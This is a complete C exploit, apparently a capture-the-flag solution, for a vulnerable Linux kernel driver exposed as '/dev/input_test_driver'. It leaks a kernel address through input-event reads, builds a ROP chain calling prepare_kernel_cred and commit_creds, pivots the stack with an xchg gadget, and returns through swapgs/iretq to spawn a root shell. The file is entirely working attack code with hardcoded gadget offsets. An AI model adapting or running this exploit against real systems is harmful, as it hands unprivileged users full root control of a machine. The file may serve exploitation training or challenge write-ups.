//gcc -masm=intel -static -o exp exp.c -no-pie
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <sys/time.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/mman.h>

#define SIZE 416
#define FOR_LEAK 392
#define KEY 0x700001

struct register_val {
    uint64_t user_rip;
    uint64_t user_cs;
    uint64_t user_rflags;
    uint64_t user_rsp;
    uint64_t user_ss;
} __attribute__((packed));

struct register_val rv;
struct input_event ie;
int evdev, itd, itd2, itd3;
uint64_t result;

void backup_rv(void) {
    asm("mov rv+8, cs;"
        "pushf; pop rv+16;"
        "mov rv+24, rsp;"
        "mov rv+32, ss;"
       );
}

void shell() {
    execl("/bin/sh", "sh", NULL);
}

void setPayload(size_t arr2[]) {
    uint32_t xchg;
    int i;

    xchg = (uint32_t)(result - 0x311f7);
    mmap((void *)xchg, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);

    backup_rv();

    *(uint64_t*)xchg = result + 0x3d5f1c;             // 0xffffffff814c173c;       // pop rdi; ret
    *(uint64_t*)(xchg+8) = 0;
    *(uint64_t*)(xchg+16) = result - 0x3ded0;         // prepare_kernel_cred
    *(uint64_t*)(xchg+24) = result + 0x3d5eb6;        // 0xffffffff814c16d6;       // pop rdx; ret
    *(uint64_t*)(xchg+32) = result - 0x3e280;         // commit_creds;
    *(uint64_t*)(xchg+40) = result - 0x31227;         // 0xffffffff810ba5f9;       // mov rdi,rax; call rdx;
    *(uint64_t*)(xchg+48) = 0;
    *(uint64_t*)(xchg+56) = result - 0x81c5c;         // 0xffffffff81069bc4;       // swapgs; pop rbp; ret;
    *(uint64_t*)(xchg+64) = 0;
    *(uint64_t*)(xchg+72) = result - 0x31207;         // 0xffffffff810ba619;       // iretq; ret;
    *(uint64_t*)(xchg+80) = &shell;
    *(uint64_t*)(xchg+88) = rv.user_cs;
    *(uint64_t*)(xchg+96) = rv.user_rflags;
    *(uint64_t*)(xchg+104) = rv.user_rsp;
    *(uint64_t*)(xchg+112) = rv.user_ss;

    for(i=0; i<50; i++)
        arr2[i] = 0;
    arr2[50] = result - 0x311f7;         // 0xffffffff810ba629;    // xchg esp,eax; ret
    arr2[51] = 0;
}

void leakGift() {
    int i = 0, j = 0, set = 0;
    int ret;
    char leak[8];

    for(i=0; i<50; i++) {
        sleep(0.1);

        ret = read(evdev, &ie, sizeof(struct input_event));
        if(ret < 0) {
            perror("error");
            break;
        }
        if(set == 1 && ie.type == 3 && ie.code == 0 && j<4) {
            leak[j] = ie.value;
            j++;
        }
        if(ie.value == 0x7)
            set = 1;

        printf("type: %hu, code: %hu, value: 0x%hhx \n", ie.type, ie.code, ie.value);
    }
    for(j=4; j<8; j++) {
        leak[j] = 0xff;
    }

    memcpy(&result, leak, 8);
}

int main()
{
    char arr[FOR_LEAK] = {0, };
    size_t arr2[(SIZE/8)] = {0, };
    int i;

    evdev = open("/dev/input/event2", O_RDONLY);
    if(evdev < 0) {
        perror("event2");
        return -1;
    }

    itd2 = open("/dev/input_test_driver", O_RDWR);
    if(itd2 < 0) {
        perror("input_test_driver_2");
        return -1;
    }

    arr[0] = 1;
    arr[1] = 2;

    write(itd2, arr, 2);
    ioctl(itd2, 0x1337, 0);
    close(itd2);

    itd = open("/dev/input_test_driver", O_RDWR);
    if(itd < 0) {
        perror("input_test_driver");
        return -1;
    }

    for(i=0; i<FOR_LEAK; i++)
        arr[i] = 7;

    write(itd, arr, FOR_LEAK);
    ioctl(itd, 0x1337, 0); 

    leakGift();

    close(itd);

    itd3 = open("/dev/input_test_driver", O_RDWR);
    if(itd3 < 0) {
        perror("input_test_driver_3");
        return -1;
    }

    arr2[0] = 1;
    arr2[1] = 2;

    write(itd3, arr2, SIZE);
    write(itd3, arr2, KEY);
    ioctl(itd3, 0x1337, 0);

    setPayload(arr2);

    write(itd3, arr2, KEY);
    ioctl(itd3, 0x1337, 0);      // boom!!

    close(evdev);
    close(itd3);

    return 0;
}
